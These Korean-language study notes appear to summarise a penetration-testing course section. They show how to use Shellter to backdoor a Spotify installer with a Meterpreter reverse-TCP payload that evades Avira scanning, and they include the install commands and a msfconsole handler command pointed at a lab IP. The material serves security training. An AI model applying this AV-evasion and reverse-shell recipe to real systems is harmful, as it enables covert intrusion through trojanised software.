# 15.3.3 절차 자동화

> **Automating the Process** · PEN-200 §15.3.3

**Shellter** 는 동적 셸코드 인젝션 도구이며, AV 우회가 가능한 무료 도구 중 가장 널리 쓰이는 축임. 정상적이고 악성이 아닌 실행 파일에 악성 셸코드 페이로드를 심어 백도어로 만듦.

**왜 통하는가** — 세부는 범위 밖이지만, 핵심은 대상 PE 파일과 그 실행 경로를 철저히 분석해 **AV 엔진이 쉽게 잡는 전통적 인젝션 흔적 없이** 셸코드를 넣을 위치를 정한다는 것임. 그 흔적이란 PE 섹션 권한 변경, 새 섹션 생성 같은 것들임. 나아가 기존 PE 의 IAT(Import Address Table) 항목을 이용해 페이로드의 메모리 할당·전송·실행에 쓸 함수를 찾아냄. 32·64비트를 모두 지원하고 더 은밀한 안티 AV 기능이 붙은 유료판 Shellter Pro 도 있음.

설치는 Kali 의 `apt` 로 함.

```
kali@kali:~$ apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector
kali@kali:~$ sudo apt install shellter
...
```

*Kali 에 Shellter 설치*

Shellter 자체가 Windows 용으로 만들어진 도구라, POSIX 계열에서 win32 응용프로그램을 돌리는 호환 계층인 **wine** 도 함께 필요함.

```
kali@kali:~$ sudo apt install wine
...
kali@kali:~$ sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```

*wine 설치 — 마지막 명령이 다음 줄로 접혀 있음(실제로는 한 줄)*

ARM 프로세서를 쓴다면 명령이 조금 다름.

```
kali@kali:~$ sudo apt install wine
kali@kali:~$ sudo dpkg --add-architecture amd64
kali@kali:~$ sudo  apt install -y qemu-user-static binfmt-support
kali@kali:~$ sudo apt-get update && apt-get install wine32
```

*ARM 환경에서의 wine 설치*

설치가 끝나고 `shellter` 를 실행하면 wine 위에서 도는 콘솔이 뜸. 모드는 Auto 와 Manual 둘 — Manual 은 주입 대상 PE 를 띄워 세밀하게 조작하는 모드로, **자동 선택된 옵션이 실패할 때 쓰는 수단**임. 예제는 프롬프트에서 `A` 를 골라 Auto 로 진행함.

*Shellter 초기 콘솔 — Auto/Manual 선택 지점*

다음은 대상 PE 지정임. 예제는 Spotify 의 Windows 32비트 시험판 설치 관리자를 씀. **실전에서는 새롭고 덜 분석된 애플리케이션을 고르는 것이 낫다는 것이 제작자의 권고**임. Shellter 는 원본 PE 를 분석·변조하기 전에 먼저 백업을 만듦.

주입 위치를 찾으면 **Stealth Mode** 를 켤지 물음. 페이로드 실행 후 PE 의 원래 실행 흐름을 복원하는 기능이라, 설치 관리자가 정상적으로 동작해 의심을 사지 않게 됨. 다만 커스텀 페이로드로 이 모드를 쓰려면 **페이로드가 현재 스레드를 종료하며 끝나야 함.**

이어서 페이로드 목록이 나옴. Meterpreter 같은 대표적인 것들이 있고 커스텀 페이로드도 지원함.

⚠️ **함정 — Windows 11 에서는 Meterpreter 가 아닌 페이로드가 제대로 실행되지 않음.** 따라서 Meterpreter 계열을 써야 함. `L` 로 목록 페이로드를 선택하고 첫 번째를 고른 뒤, Metasploit 기본 옵션인 `LHOST`·`LPORT` 에 Kali 의 IP 와 수신 포트를 넣음. 옵션이 다 채워지면 Shellter 가 페이로드를 설치 관리자에 주입하고 페이로드 첫 명령까지 도달하는지 확인함.

악성 PE 를 Windows 클라이언트로 옮기기 전에 Kali 에 핸들러를 띄움.

```
kali@kali:~$ msfconsole -x "use exploit/multi/handler;set payload
windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
```

*Meterpreter 페이로드용 핸들러 — 교재 지면에서 한 줄이 두 줄로 접혀 있음. 그대로 복사해 쓰면 실패함*

백도어링한 설치 관리자를 Windows 11 클라이언트로 옮기고 Avira Quick Scan 을 돌림. Quick Scan 은 Desktop 을 포함한 각 사용자 공용 폴더를 검사하는데, **Shellter 가 페이로드와 페이로드 디코더를 «둘 다» 난독화한 뒤 PE 에 주입하므로** 시그니처 기반 스캔이 깨끗하게 통과하고 악성으로 보지 않음.

![[PEN200-Fig-247.png]]

*백도어링된 설치 관리자에 대한 Avira Quick Scan — 탐지 없음*

파일을 실행하면 평소와 같은 Spotify 설치 화면이 뜸(예제 VM 은 인터넷이 없어 설치 관리자가 무한 대기 상태로 남음). 그 사이 `multi/handler` 쪽에는 Meterpreter 세션이 열리고, `shell` 로 대화형 Windows 셸에 들어가 `whoami` 로 `client01\offsec` 임을 확인함.

*핸들러에 열린 Meterpreter 세션과 `shell` 로 진입한 대화형 셸 (원문 Listing 354)*

정상 프로그램에 악성 페이로드를 심는 것만으로 AV 탐지를 회피한 셈이고, 이 기본형은 실제 피싱 업무에서 사례별로 확장·조정할 수 있음.
